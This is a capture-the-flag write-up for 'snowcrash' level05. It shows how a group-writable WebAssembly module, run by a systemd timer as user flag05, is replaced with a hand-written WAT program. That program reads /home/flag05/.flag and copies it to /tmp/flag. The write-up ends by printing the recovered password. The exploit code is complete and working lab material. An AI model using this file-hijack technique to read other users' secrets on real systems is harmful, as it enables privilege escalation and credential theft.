# Level 05

There are two files in `/opt/snowcrash/level05` :

```bash
$ ls -la /opt/snowcrash/level05
total 16
drwxrwxr-x  2 root metaverse 4096 Sep  9 11:38 .
drwxr-xr-x 18 root root      4096 Jun  9 19:04 ..
-rw-rw-r--  1 root metaverse  347 Sep 10 09:18 metaverse.wasm
-rw-r--r--  1 root root       855 Jun  9 19:03 metaverse.wat
```

We see that we are able to write in metaverse.wasm, as we belong to the group metaverse :

```bash
$ groups
level05 metaverse levelgroup
```

We look once again for files containing the name `metaverse` for hints :

```bash
$ find / -name '*metaverse*' -ls 2>/dev/null 
   138325      0 lrwxrwxrwx   1 root     root           35 Jun  9 19:03 /etc/systemd/system/timers.target.wants/metaverse.timer -> /etc/systemd/system/metaverse.timer
   524473      4 -rw-r--r--   1 root     root          187 Jun  9 19:03 /etc/systemd/system/metaverse.timer
   524472      4 -rw-r--r--   1 root     root          235 Jun  9 19:03 /etc/systemd/system/metaverse.service
   394423      4 -rw-rw-r--   1 root     metaverse      347 Sep 10 09:18 /opt/snowcrash/level05/metaverse.wasm
   524471      4 -rw-r--r--   1 root     root           855 Jun  9 19:03 /opt/snowcrash/level05/metaverse.wat
```

Once again, there is a timer and a service. If we look at the service :

```bash
$ systemctl cat metaverse.service 
# /etc/systemd/system/metaverse.service
[Unit]
Description=Metaverse WASM runtime (one-shot)
After=network.target

[Service]
Type=oneshot
User=flag05
ExecStart=/usr/local/bin/wasmtime --dir=/ /opt/snowcrash/level05/metaverse.wasm
StandardOutput=journal
StandardError=journal
```

we cans see that it executes with `wasmtime` the `.wasm` file above, with the dir as `/`, and by user `flag05`. In WebAssembly, it means that the program can look anywhere above this directory. The timer launches the service every 30 seconds. Because we can write in the wasm file, we just need to write a `.wat` file that allows us to read the flag file.

```wasm
(module
  (import "wasi_snapshot_preview1" "path_open"
    (func $path_open
      (param i32 i32 i32 i32 i32 i64 i64 i32 i32)
      (result i32)
    )
  )

  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read
      (param i32 i32 i32 i32)
      (result i32)
    )
  )

  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write
      (param i32 i32 i32 i32)
      (result i32)
    )
  )

  (memory 1)
  (export "memory" (memory 0))

  (data (i32.const 0)  "home/flag05/.flag")
  (data (i32.const 32) "tmp/flag")


  ;; 0   : input file, /home/flag05/.flag
  ;; 32  : output flag, /tmp/flag
  ;; 64  : buffer[32]
  ;;
  ;; 128 : read iovec
  ;; 136 : write iovec
  ;; 144 : read chars
  ;; 148 : written chars
  ;; 152 : fd of input file
  ;; 156 : fd of output file

  (func $_start
    (local $fd1 i32)
    (local $fd2 i32)
    (local $r i32)


    ;; fd1 = open("/tmp/myfile.txt", O_RDONLY)

    i32.const 3              ;; dirfd = /
    i32.const 0              ;; dirflags
    i32.const 0              ;; path = "home/flag05/.flag"
    i32.const 17             ;; path_len = strlen("home/flag05/.flag")
    i32.const 0              ;; oflags = 0 (O_RDONLY)
    i64.const 2              ;; rights_base = FD_READ
    i64.const 0              ;; rights_inheriting
    i32.const 0              ;; fdflags
    i32.const 152            ;; adress of read fd
    call $path_open

    drop

    ;; Save fd in fd1
    i32.const 152
    i32.load
    local.set $fd1


    ;; iov.buf = 64
    i32.const 128
    i32.const 64
    i32.store

    ;; iov.buf_len = 32
    i32.const 132
    i32.const 32
    i32.store

    ;; fd_read(fd1, &iov, 1, &nread)
    local.get $fd1
    i32.const 128
    i32.const 1
    i32.const 144
    call $fd_read

    drop

    ;; r = nread
    i32.const 144
    i32.load
    local.set $r


    ;; fd2 = open(
    ;;     "/tmp/flag",
    ;;     O_CREAT | O_WRONLY
    ;; )

    i32.const 3              ;; dirfd = /
    i32.const 0              ;; dirflags
    i32.const 32             ;; path = "tmp/flag"
    i32.const 8              ;; path_len = strlen("tmp/flag")
    i32.const 1              ;; OFLAGS_CREAT
    i64.const 64             ;; rights_base = FD_WRITE
    i64.const 0              ;; rights_inheriting
    i32.const 0              ;; fdflags
    i32.const 156            ;; adress of fd write
    call $path_open

    drop

    i32.const 156
    i32.load
    local.set $fd2


    ;; iov.buf = 64
    i32.const 136
    i32.const 64
    i32.store

    ;; iov.buf_len = r
    i32.const 140
    local.get $r
    i32.store

    ;; fd_write(fd2, &iov, 1, &nwritten)
    local.get $fd2
    i32.const 136
    i32.const 1
    i32.const 148
    call $fd_write

    drop
  )


  (export "_start" (func $_start))
)
```

Pretty heavy, but all it does is open `/home/flag05/.flag`, read it, and write the content in `/tmp/flag`. And after waiting for the timer, we can open the output file, and see the password : viuaaale9huek52boumoomioc